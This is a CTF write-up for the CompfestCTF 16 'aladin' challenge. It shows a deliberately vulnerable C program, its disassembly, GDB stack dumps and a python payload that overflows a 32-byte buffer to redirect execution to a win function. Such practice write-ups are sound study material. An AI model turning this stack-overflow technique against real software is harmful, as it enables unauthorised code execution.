# aladin Writeup by Deffreus - CompfestCTF 16

######  Author: nabilmuafa

## Description

terkadang sebuah perjuangan tidak hanya memerlukan usaha, tapi memerlukan bantuan dari dunia gaib, hehehe...

`nc challenges.ctf.compfest.id 20006`

[chall](https://ctf.compfest.id/files/152f45b73ba532a4fbda834cc5b3a949/chall?token=eyJ1c2VyX2lkIjo3MiwidGVhbV9pZCI6MzA3LCJmaWxlX2lkIjozOH0.Zq-ksA.k6n3WvyNeG1S1iyPSO5hnXy_q3g) [chall.c](https://ctf.compfest.id/files/594dea0c23d589a984ead62d076c69e9/chall.c?token=eyJ1c2VyX2lkIjo3MiwidGVhbV9pZCI6MzA3LCJmaWxlX2lkIjozOX0.Zq-ksA.jWAr7fCzftO_r-rU-qCbUIEB_Wo)

## Files

chall:

```
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6bcf9a6858a5b44bceb38771050195923a102f04, for GNU/Linux 3.2.0, not stripped
```

chall.c:

```chall.c
#include <stdio.h>
#include <stdlib.h>

/* gcc -Wl,-z,relro,-z,now -no-pie -fno-stack-protector chall.c -o chall */

void win(int mantra)
{
    puts("wow! mantra kamu benar! sebagai hadiahnya, jin akan memberikan kamu suatu mantra lain yang dapat kamu gunakan untuk menang ctf compfest (semoga beneran).");
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
        printf("File flag.txt does not exist! >:(");
        return 69;
    }
    char flag[0x100];
    fgets(flag, 0x100, f);
    puts(flag);
}

void vuln()
{
    char mantra[32];

    puts("kamu menemukan sebuah gua... di dalam gua tersebut ada jin yang bisa memberi kamu akses jadi pemenang ctf compfest 16...");
    puts("tapi syaratnya kamu harus bisa menyebutkan mantra sakti yang diinginkan jin tersebut...\n");
    puts("jin: 'tenang saja... soal ini tidak toksik seperti soal tahun lalu... tapi kamu harus menyebutkan mantra sakti...'\n");
    printf("sebutkan mantra sakti tersebut: ");

    read(0, mantra, 0x200);

    puts("duar! jin tersebut memproses mantra sakti kamu... apakah kamu akan jadi pemenang ctf compfest 16...?\n");
}

int main()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    vuln();
    puts("yah, nampaknya mantra kamu masih salah...");
    return 0;
}
```

## Solution

Just a buffer overflow!
The adress of `win` is `0x00000000004011d6`

```
Dump of assembler code for function win:
   0x00000000004011d6 <+0>:     endbr64 
   0x00000000004011da <+4>:     push   rbp
   0x00000000004011db <+5>:     mov    rbp,rsp
   0x00000000004011de <+8>:     sub    rsp,0x120
   0x00000000004011e5 <+15>:    mov    DWORD PTR [rbp-0x114],edi
   0x00000000004011eb <+21>:    lea    rdi,[rip+0xe16]        # 0x402008
   0x00000000004011f2 <+28>:    call   0x401090 <puts@plt>
   0x00000000004011f7 <+33>:    lea    rsi,[rip+0xea4]        # 0x4020a2
   0x00000000004011fe <+40>:    lea    rdi,[rip+0xe9f]        # 0x4020a4
   0x0000000000401205 <+47>:    call   0x4010e0 <fopen@plt>
   0x000000000040120a <+52>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040120e <+56>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x0000000000401213 <+61>:    jne    0x401228 <win+82>
   0x0000000000401215 <+63>:    lea    rdi,[rip+0xe94]        # 0x4020b0
   0x000000000040121c <+70>:    mov    eax,0x0
   0x0000000000401221 <+75>:    call   0x4010a0 <printf@plt>
   0x0000000000401226 <+80>:    jmp    0x40124f <win+121>
   0x0000000000401228 <+82>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040122c <+86>:    lea    rax,[rbp-0x110]
   0x0000000000401233 <+93>:    mov    esi,0x100
   0x0000000000401238 <+98>:    mov    rdi,rax
   0x000000000040123b <+101>:   call   0x4010c0 <fgets@plt>
   0x0000000000401240 <+106>:   lea    rax,[rbp-0x110]
   0x0000000000401247 <+113>:   mov    rdi,rax
   0x000000000040124a <+116>:   call   0x401090 <puts@plt>
   0x000000000040124f <+121>:   leave  
   0x0000000000401250 <+122>:   ret    
```

Look here:

```chall.c
void vuln() {
    char mantra[32];

    ...

    read(0, mantra, 0x200);

    puts("duar! jin tersebut memproses mantra sakti kamu... apakah kamu akan jadi pemenang ctf compfest 16...?\n");
}
```

`read` maximum input length is `0x200`, or 512, but the buffer is only 32 byte long.
`vuln` are supposed to return to `main` at the `puts` function right next to where it's called, but we should be able to overwrite the return address to `win`'s address.

```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x6               
$rbx   : 0x0               
$rcx   : 0x00007ff9d0b7a7e2  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x200             
$rsp   : 0x00007ffd18186a10  →  0x00000a7472657771 ("qwert\n"?)
$rbp   : 0x00007ffd18186a30  →  0x00007ffd18186a40  →  0x0000000000000001
$rsi   : 0x00007ffd18186a10  →  0x00000a7472657771 ("qwert\n"?)
$rdi   : 0x0000000000402258  →  "duar! jin tersebut memproses mantra sakti kamu... [...]"
$rip   : 0x00000000004012b4  →  <vuln+0063> call 0x401090 <puts@plt>
$r8    : 0x20              
$r9    : 0x00007ff9d0caa040  →  <_dl_fini+0000> endbr64 
$r10   : 0x0000000000402230  →  "sebutkan mantra sakti tersebut: "
$r11   : 0x246             
$r12   : 0x00007ffd18186b58  →  0x00007ffd1818775a  →  "/home/d3ffr3u5-picoctf/chall"
$r13   : 0x00000000004012bc  →  <main+0000> endbr64 
$r14   : 0x0               
$r15   : 0x00007ff9d0cde040  →  0x00007ff9d0cdf2e0  →  0x0000000000000000
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd18186a10│+0x0000: 0x00000a7472657771 ("qwert\n"?)      ← $rsp, $rsi
0x00007ffd18186a18│+0x0008: 0x00007ffd18186a40  →  0x0000000000000001
0x00007ffd18186a20│+0x0010: 0x00007ffd18186b58  →  0x00007ffd1818775a  →  "/home/d3ffr3u5-picoctf/chall"
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x6               
$rbx   : 0x0               
$rcx   : 0x00007ff9d0b7a7e2  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x200             
$rsp   : 0x00007ffd18186a10  →  0x00000a7472657771 ("qwert\n"?)
$rbp   : 0x00007ffd18186a30  →  0x00007ffd18186a40  →  0x0000000000000001
$rsi   : 0x00007ffd18186a10  →  0x00000a7472657771 ("qwert\n"?)
$rdi   : 0x0000000000402258  →  "duar! jin tersebut memproses mantra sakti kamu... [...]"
$rip   : 0x00000000004012b4  →  <vuln+0063> call 0x401090 <puts@plt>
$r8    : 0x20              
$r9    : 0x00007ff9d0caa040  →  <_dl_fini+0000> endbr64 
$r10   : 0x0000000000402230  →  "sebutkan mantra sakti tersebut: "
$r11   : 0x246             
$r12   : 0x00007ffd18186b58  →  0x00007ffd1818775a  →  "/home/d3ffr3u5-picoctf/chall"
$r13   : 0x00000000004012bc  →  <main+0000> endbr64 
$r14   : 0x0               
$r15   : 0x00007ff9d0cde040  →  0x00007ff9d0cdf2e0  →  0x0000000000000000
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd18186a10│+0x0000: 0x00000a7472657771 ("qwert\n"?)      ← $rsp, $rsi
0x00007ffd18186a18│+0x0008: 0x00007ffd18186a40  →  0x0000000000000001
0x00007ffd18186a20│+0x0010: 0x00007ffd18186b58  →  0x00007ffd1818775a  →  "/home/d3ffr3u5-picoctf/chall"
0x00007ffd18186a28│+0x0018: 0x00000000004012bc  →  <main+0000> endbr64 
0x00007ffd18186a30│+0x0020: 0x00007ffd18186a40  →  0x0000000000000001    ← $rbp
0x00007ffd18186a38│+0x0028: 0x0000000000401328  →  <main+006c> lea rdi, [rip+0xf91]        # 0x4022c0
0x00007ffd18186a40│+0x0030: 0x0000000000000001
0x00007ffd18186a48│+0x0038: 0x00007ff9d0a8fd90  →  <__libc_start_call_main+0080> mov edi, eax
────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4012a3 <vuln+0052>      mov    eax, 0x0
     0x4012a8 <vuln+0057>      call   0x4010b0 <read@plt>
     0x4012ad <vuln+005c>      lea    rdi, [rip+0xfa4]        # 0x402258
 →   0x4012b4 <vuln+0063>      call   0x401090 <puts@plt>
   ↳    0x401090 <puts@plt+0000>  endbr64 
        0x401094 <puts@plt+0004>  bnd    jmp QWORD PTR [rip+0x2f25]        # 0x403fc0 <puts@got.plt>
        0x40109b <puts@plt+000b>  nop    DWORD PTR [rax+rax*1+0x0]
        0x4010a0 <printf@plt+0000> endbr64 
        0x4010a4 <printf@plt+0004> bnd    jmp QWORD PTR [rip+0x2f1d]        # 0x403fc8 <printf@got.plt>
        0x4010ab <printf@plt+000b> nop    DWORD PTR [rax+rax*1+0x0]
────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
puts@plt (
   $rdi = 0x0000000000402258 → "duar! jin tersebut memproses mantra sakti kamu... [...]",
   $rsi = 0x00007ffd18186a10 → 0x00000a7472657771 ("qwert\n"?),
   $rdx = 0x0000000000000200,
   $rcx = 0x00007ff9d0b7a7e2 → 0x5677fffff0003d48 ("H="?)
)
────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x4012b4 in vuln (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4012b4 → vuln()
[#1] 0x401328 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────
```

```
─────────────────────────────── stack ────
0x00007ffd18186a10│+0x0000: 0x00000a7472657771 ("qwert\n"?)      ← $rsp, $rsi
0x00007ffd18186a18│+0x0008: 0x00007ffd18186a40  →  0x0000000000000001
0x00007ffd18186a20│+0x0010: 0x00007ffd18186b58  →  0x00007ffd1818775a  →  "/home/d3ffr3u5-picoctf/chall"
0x00007ffd18186a28│+0x0018: 0x00000000004012bc  →  <main+0000> endbr64 
0x00007ffd18186a30│+0x0020: 0x00007ffd18186a40  →  0x0000000000000001    ← $rbp
0x00007ffd18186a38│+0x0028: 0x0000000000401328  →  <main+006c> lea rdi, [rip+0xf91]        # 0x4022c0
0x00007ffd18186a40│+0x0030: 0x0000000000000001
0x00007ffd18186a48│+0x0038: 0x00007ff9d0a8fd90  →  <__libc_start_call_main+0080> mov edi, eax
```

We need to rewrite `0x00007ffd18186a38` to point to the address of win.
I then used the input of (length: 94):

`1234567890-=qwertyuiop[]\asdfghjkl;'zxcvbnm,./~!@#$%^&*()_+QWERTYUIOP{}|ASDFGHJKL:"ZXCVBNM<>?

Seeing the offset of the memory address with the return address:

```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────── registers ────
$rax   : 0x66              
$rbx   : 0x0               
$rcx   : 0x00007f24725c6887  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x00007ffdf48a3d98  →  "bnm,./~!@#$%^&*()_+QWERTYUIOP{}|ASDFGHJKL:"ZXCVBNM[...]"
$rbp   : 0x7663787a273b6c6b ("kl;'zxcv"?)
$rsi   : 0x1               
$rdi   : 0x00007f24726cea70  →  0x0000000000000000
$rip   : 0x00000000004012bb  →  <vuln+006a> ret 
$r8    : 0x65              
$r9    : 0x00007f24726f6040  →  <_dl_fini+0000> endbr64 
$r10   : 0x0000000000402230  →  "sebutkan mantra sakti tersebut: "
$r11   : 0x246             
$r12   : 0x00007ffdf48a3eb8  →  0x00007ffdf48a475a  →  "/home/d3ffr3u5-pico
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────── registers ────
$rax   : 0x66              
$rbx   : 0x0               
$rcx   : 0x00007f24725c6887  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x00007ffdf48a3d98  →  "bnm,./~!@#$%^&*()_+QWERTYUIOP{}|ASDFGHJKL:"ZXCVBNM[...]"
$rbp   : 0x7663787a273b6c6b ("kl;'zxcv"?)
$rsi   : 0x1               
$rdi   : 0x00007f24726cea70  →  0x0000000000000000
$rip   : 0x00000000004012bb  →  <vuln+006a> ret 
$r8    : 0x65              
$r9    : 0x00007f24726f6040  →  <_dl_fini+0000> endbr64 
$r10   : 0x0000000000402230  →  "sebutkan mantra sakti tersebut: "
$r11   : 0x246             
$r12   : 0x00007ffdf48a3eb8  →  0x00007ffdf48a475a  →  "/home/d3ffr3u5-picoctf/chall"
$r13   : 0x00000000004012bc  →  <main+0000> endbr64 
$r14   : 0x0               
$r15   : 0x00007f247272a040  →  0x00007f247272b2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────── stack ────
0x00007ffdf48a3d98│+0x0000: "bnm,./~!@#$%^&*()_+QWERTYUIOP{}|ASDFGHJKL:"ZXCVBNM[...]"       ← $rsp
0x00007ffdf48a3da0│+0x0008: "@#$%^&*()_+QWERTYUIOP{}|ASDFGHJKL:"ZXCVBNM<>?\n"
0x00007ffdf48a3da8│+0x0010: ")_+QWERTYUIOP{}|ASDFGHJKL:"ZXCVBNM<>?\n"
0x00007ffdf48a3db0│+0x0018: "YUIOP{}|ASDFGHJKL:"ZXCVBNM<>?\n"
0x00007ffdf48a3db8│+0x0020: "ASDFGHJKL:"ZXCVBNM<>?\n"
0x00007ffdf48a3dc0│+0x0028: "L:"ZXCVBNM<>?\n"
0x00007ffdf48a3dc8│+0x0030: 0x00000a3f3e3c4d4e ("NM<>?\n"?)
0x00007ffdf48a3dd0│+0x0038: 0x0000000000000000
────────────────────────────────────────────────────────── code:x86:64 ────
     0x4012b4 <vuln+0063>      call   0x401090 <puts@plt>
     0x4012b9 <vuln+0068>      nop    
     0x4012ba <vuln+0069>      leave  
 →   0x4012bb <vuln+006a>      ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x4012bb in vuln (), reason: SIGSEGV
──────────────────────────────────────────────────────────────── trace ────
[#0] 0x4012bb → vuln()
───────────────────────────────────────────────────────────────────────────
(gdb) 
```

Let's try again with (length: 81):

`1234567890-=qwertyuiop[]\asdfghjkl;'zxcvbnm,./~!@#$%^&*()_+QWERTYUIOP{}|ASDFGHJK

```
──────────────────────────────────────────────────────────────── stack ────
0x00007ffff1ebb4a8│+0x0000: "vbnm,./~!@#$%^&*()_+QWERTYUIOP{}|ASDFGHJK\n"  ← $rsp
0x00007ffff1ebb4b0│+0x0008: "!@#$%^&*()_+QWERTYUIOP{}|ASDFGHJK\n"
0x00007ffff1ebb4b8│+0x0010: "()_+QWERTYUIOP{}|ASDFGHJK\n"
0x00007ffff1ebb4c0│+0x0018: "TYUIOP{}|ASDFGHJK\n"
0x00007ffff1ebb4c8│+0x0020: "|ASDFGHJK\n"
0x00007ffff1ebb4d0│+0x0028: 0x0000000100000a4b ("K\n"?)
0x00007ffff1ebb4d8│+0x0030: 0x00007ffff1ebb5c8  →  0x00007ffff1ebd75a  →  "/home/d3ffr3u5-picoctf/chall"
0x00007ffff1ebb4e0│+0x0038: 0x0000000000000000
```

Okay, it seems like we need to input 80 character first before reaching the memory address of the return address.
Then, we'll append `0x00000000004011d6` in little endian, becoming `\xd6\x11\x40\x00\x00\x00\x00\x00`.
Let's try again.

```
$ python3 -c 'print("AAAAAAA\n" + "\x01\x00\x00\x00\x00\x00\x00\x00" + 
"\x5a\xa7\xa2\x4c\xff\x7f\x00\x00" + 
"\xbc\x12\x40\x00\x00\x00\x00\x00" + 
"\x20\x9b\xa2\x4c\xff\x7f\x00\x00"
"\xd6\x11\x40\x00\x00\x00\x00\x00")' >input
```
